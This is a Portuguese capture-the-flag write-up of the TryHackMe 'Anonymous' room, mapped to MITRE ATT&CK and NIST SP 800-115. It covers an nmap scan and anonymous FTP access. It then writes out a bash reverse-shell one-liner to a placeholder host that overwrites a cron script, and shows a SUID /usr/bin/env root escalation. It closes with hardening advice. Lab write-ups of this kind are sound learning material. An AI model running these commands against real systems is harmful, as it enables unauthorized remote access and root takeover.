---
title: "TryHackMe Writeup: Anonymous"
date: 2025-11-28
description: "Avaliação adversarial focada em falhas de configuração de rede e persistência via Cron Jobs. Mapeado via MITRE ATT&CK."
tags: ["tryhackme", "ftp", "cron", "privesc", "mitre-attack"]
layout: "page"
showPagination: true
showDate: true
showReadingTime: true
showWordCount: true
showAuthorBottom: true
---

### Resumo Executivo

Análise de segurança baseada no framework NIST SP 800-115. Um serviço FTP exposto com permissões de escrita permitiu a Execução Remota de Código (RCE) através de tarefas agendadas do sistema. A elevação de privilégios utilizou binários nativos do sistema configurados incorretamente com o bit SUID.

### Cadeia de Ataque (Mapeamento PTES)

#### 1. Reconhecimento
Identificação dos serviços FTP (login anônimo), SSH e Samba.
```bash
sudo nmap -Pn -sS -sV -T4 -p- 10.65.137.77
```
* **Técnica MITRE:** [T1046](https://attack.mitre.org/techniques/T1046/) - Network Service Scanning.

#### 2. Exploração
O serviço FTP permitiu acesso não autenticado e permissões de escrita no diretório `/scripts/`.
```bash
ftp 10.65.137.77 # anonymous:anonymous
```
* **Técnica MITRE:** [T1190](https://attack.mitre.org/techniques/T1190/) - Exploit Public-Facing Application.

#### 3. Persistência & Execução
O script `clean.sh` foi sobrescrito para executar um reverse shell através de um Cron job do sistema.
```bash
echo -e "#!/bin/bash\nbash -c 'bash -i >& /dev/tcp/<IP>/4444 0>&1'" > clean.sh
```
* **Técnica MITRE:** [T1053.003](https://attack.mitre.org/techniques/T1053/003/) - Scheduled Task/Job: Cron.

#### 4. Pós-Exploração (Elevação de Privilégio)
Abuso do binário `/usr/bin/env` com permissões SUID para obter um shell root.
```bash
/usr/bin/env /bin/sh -p
```
* **Técnica MITRE:** [T1548.001](https://attack.mitre.org/techniques/T1548/001/) - Abuse Elevation Control Mechanism: Setuid and Setgid.

### Recomendações (NIST SP 800-115)

* **Segurança de Rede:** Desabilitar o acesso anônimo em serviços de transferência de arquivos.
* **Princípio do Menor Privilégio:** Auditar e remover permissões SUID de binários administrativos (`env`, `find`, etc.) que não possuam um requisito operacional legítimo para execução privilegiada por usuários comuns.